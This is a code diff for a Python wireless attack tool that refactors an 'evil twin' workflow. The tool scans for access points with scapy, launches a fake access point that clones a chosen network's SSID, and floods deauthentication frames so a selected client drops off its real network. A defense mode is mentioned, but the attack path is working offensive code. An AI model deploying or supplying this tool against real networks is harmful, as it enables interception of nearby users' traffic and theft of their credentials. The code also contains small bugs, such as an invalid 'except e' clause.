@@ -10,7 +10,7 @@ from UI import *
 # (disabling Traceback on interrupt [Ctrl-c])
 import signal
 import sys
-signal.signal(signal.SIGINT, lambda x, y: sys.exit('\n'))
+signal.signal(signal.SIGINT, lambda x, y: abortSettings())
 
 import warnings
 
@@ -64,7 +64,7 @@ def change_channel():
     ch = 1
 
     while True:
-        os.system(f"iwconfig {interface} channel {ch}")
+        os.system(f"iwconfig {interface_attack} channel {ch}")
         # switch channel from 1 to 14 each 0.5s
         ch = ch % 14 + 1
         time.sleep(0.5)
@@ -93,18 +93,18 @@ def evil_twin():
     # 12. Fake AP
     fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
                   net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_internet + ' ' + interface_fake + ';"$SHELL'
-    print(fake_ap_cmd)
+    # print(fake_ap_cmd)
     os.system(fake_ap_cmd)
 
     # 13. User attack
     # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
     print('The target is: ', target_mac)
-    print('\nDo not close this window')
+    print('\nDo not close this window (Ctrl-C to abort)')
     frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
     frame2 = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
 
-    deauth1 = threading.Thread(target=for_ap, args=(frame1, interface))
-    deauth2 = threading.Thread(target=for_ap, args=(frame2, interface))
+    deauth1 = threading.Thread(target=for_ap, args=(frame1, interface_attack))
+    deauth2 = threading.Thread(target=for_ap, args=(frame2, interface_attack))
     deauth1.setDaemon(True)
     deauth2.setDaemon(True)
     # Loading Circle
@@ -119,11 +119,56 @@ def evil_twin():
     deauth2.join()
     loading.join()
     
-    # 14. Disable monitor mode and cancel interface division
-    disable_monitor_mode(interface)
-    disable_monitor_mode(interface_fake)
-    if flag_div:
-        os.system("sudo iw dev mon0 interface del")
+    
+
+def abortSettings():
+    print("\n\nExiting The Utility..")
+    # Disable monitor mode
+    # try:
+    #     interface_attack
+    #     disable_monitor_mode(interface_attack)
+    #     print(f"\'{interface_attack}\' Monitor Mode Disabled Successfully!")
+    # except:
+    #     pass
+    # try:
+    #     interface_fake
+    #     disable_monitor_mode(interface_fake)
+    #     print(f"\'{interface_fake}\' Monitor Mode Disabled Successfully!")
+    # except:
+    #     pass
+    # Cancel interface division
+    try:
+        if flag_divided:
+            os.system("sudo iw dev mon0 interface del")
+            print(f"\'mon0\' Division Deleted Successfully!")
+    except:
+        pass
+    sys.exit()
+
+
+def divideInterface(interfaces):
+    val = input("\nPlease Choose an Interface above for Dividing: ")
+    while True:
+            try:
+                choose = int(val)
+                interface = interfaces[choose - 1]
+                os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
+                os.system(f"sudo iwconfig mon0 freq 2.484G")
+                os.system(f"sudo ifconfig mon0 up")
+                os.system(f"sleep 1")
+                new_interfaces = os.listdir('/sys/class/net/')
+                flag_divided = True
+                print("Completed! Run \'sudo iw dev mon0 del\' to remove the interface")
+                print("\nInterfaces:")
+                for (i, item) in enumerate(new_interfaces, start=1):
+                    print("   " + str(i) + ". " + item)
+                print()
+                break
+            except e:
+                val = input("Please Choose Interface for Dividing Again: ")
+                continue
+    return new_interfaces
+
 
 
 if __name__ == "__main__":
@@ -146,31 +191,6 @@ if __name__ == "__main__":
     else:
         action = 'Defense'
 
-    if action == 'Attack':
-    # 1. Get network interface card names & print
-        interfaces = os.listdir('/sys/class/net/')
-        print("\nInterfaces:")
-        for (i, item) in enumerate(interfaces, start=1):
-            print("   " + str(i) + ". " + item)
-        val = input("\nPlease Choose Interface for Dividing (Optional), otherwise enter -1 (ABORT: sudo iw dev mon0 del): ")
-
-    # 2. Choose card interface to split for 2 different interfaces
-        flag_div = True
-        while True:
-            try:
-                choose = int(val)
-                if choose == -1:
-                    flag_div = False
-                    break
-                interface = interfaces[choose - 1]
-                enable_monitor_mode(interface)
-                os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
-                os.system(f"sudo iwconfig mon0 freq 2.484G")
-                os.system(f"sudo ifconfig mon0 up")
-                break
-            except:
-                val = input("Please Choose Again: ")
-
     interfaces = os.listdir('/sys/class/net/')
     print("\nInterfaces:")
     for (i, item) in enumerate(interfaces, start=1):
@@ -182,14 +202,13 @@ if __name__ == "__main__":
     while True:
         try:
             choose = int(val)
-            interface = interfaces[choose - 1]
+            interface_attack = interfaces[choose - 1]
             break
         except:
-            val = input("Please Choose Again: ")
+            val = input(f"Please Choose Interface for {action} Again: ")
 
     if action == 'Attack':
-
-    # 2.2. Choose card interface to create Fake AP with
+        # 2.2. Choose card interface to create Fake AP with
         val2 = input("Please Choose Interface for Fake AP: ")
         while True:
             try:
@@ -199,23 +218,29 @@ if __name__ == "__main__":
                 interface_fake = interfaces[choose - 1]
                 break
             except:
-                val2 = input("Please Choose Again: ")
+                val2 = input("Please Choose Interface for Fake AP Again: ")
 
-        val3 = input("Please Choose Interface for Internet Access of the Fake AP: ")
-
-    # 2.3. Choose card interface to give internet access for the Fake AP
+        # 2.3. Choose card interface to give internet access for the Fake AP
+        val3 = input("Please Choose Interface for Internet Access (-1 to divide): ")
+        flag_divided = False
         while True:
             try:
-                if val3 == val or val3 == val2:
-                    raise Exception()
                 choose = int(val3)
-                interface_internet = interfaces[choose - 1]
-                break
+                if choose == -1:
+                    interfaces = divideInterface(interfaces)
+                    flag_divided = True
+                    val3 = input("Please Choose Interface for Internet Access: ")
+                else:
+                    choosed_interface = interfaces[choose - 1]
+                    if choosed_interface == interface_attack or choosed_interface == interface_fake:
+                        raise Exception()
+                    interface_internet = choosed_interface
+                    break
             except:
-                val3 = input("Please Choose Again: ")
+                val3 = input("Please Choose Interface for Internet Access Again: ")
 
     # 3. Enable monitor mode
-    enable_monitor_mode(interface)
+    enable_monitor_mode(interface_attack)
     if action == 'Attack':
         enable_monitor_mode(interface_fake)
 
@@ -228,9 +253,10 @@ if __name__ == "__main__":
             break
         except:
             sniff_timeout = input("Please Choose Again: ")
+    sniff_timeout = max(sniff_timeout, 3)
     print('\nLooking for networks.....')    
     # Loading Animation
-    loading = threading.Thread(target = loadingProgressBar, args = (sniff_timeout-1, "Scanning", "Complete"))
+    loading = threading.Thread(target = loadingProgressBar, args = (sniff_timeout-2, "Scanning", "Complete"))
     loading.start()
 
     # 4.b Start the channel changer
@@ -239,7 +265,7 @@ if __name__ == "__main__":
     channel_changer.start()
 
     # 5. Start sniffing (Synchronous process)
-    sniff(prn=callback, iface=interface, timeout=sniff_timeout)
+    sniff(prn=callback, iface=interface_attack, timeout=sniff_timeout)
 
 
     # 6. Stop changing channel thread
@@ -251,6 +277,7 @@ if __name__ == "__main__":
         sys.exit(1)
 
     # 8. Choose the AP to attack/defense
+    print("\nNetwork AP\'s:")
     print(networks.iloc[:, [0, 1]])
     #print(tableize(networks))
     net_val = input(f"\nPlease enter the index of the AP you want to {action}: ")
@@ -265,6 +292,7 @@ if __name__ == "__main__":
         i = 1
         gateway_mac = str(net[0])
         if gateway_mac in user:
+            print("\n\'" + str(net["SSID"]) + "\' Clients:")
             for n in user[gateway_mac]:
                 print(str(i) + ' ' + n)
                 i += 1
@@ -294,4 +322,4 @@ if __name__ == "__main__":
     if action == 'Attack':
         evil_twin()
     else:
-        defense(interface, net, target_mac)
+        defense(interface_attack, net, target_mac)
